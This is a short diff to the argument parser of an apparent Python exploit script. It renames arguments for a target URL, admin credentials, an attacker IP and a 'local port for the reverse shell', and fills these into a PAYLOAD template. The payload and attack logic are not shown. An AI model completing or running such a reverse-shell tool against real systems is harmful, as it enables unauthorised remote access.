@@ -157,19 +157,19 @@ def parse_args() -> tuple:
     parser.add_argument("-p", type=int, help="your local port for the reverse shell", metavar="PORT", required=True)
     args = parser.parse_args()
 
-    if(not args.url.startswith("http")):
+    if(not args.u.startswith("http")):
         log.error("Missing schema (http:// | https://)")
         log.info("Adding http:// ...")
-        args.url = "http://" + args.url
+        args.u = "http://" + args.u
 
-    if(not args.url.endswith("/")):
-        args.url += "/"
+    if(not args.u.endswith("/")):
+        args.u += "/"
 
     global PAYLOAD, PORT
-    PAYLOAD = PAYLOAD.replace("CHANGEIP", args.ip).replace("CHANGEPORT", str(args.port))
-    PORT = args.port
+    PAYLOAD = PAYLOAD.replace("CHANGEIP", args.i).replace("CHANGEPORT", str(args.p))
+    PORT = args.p
 
-    return args.url, args.admin_username, args.admin_password
+    return args.u, args.au, args.ap
 
 
 def extract_value(input: str) -> str:
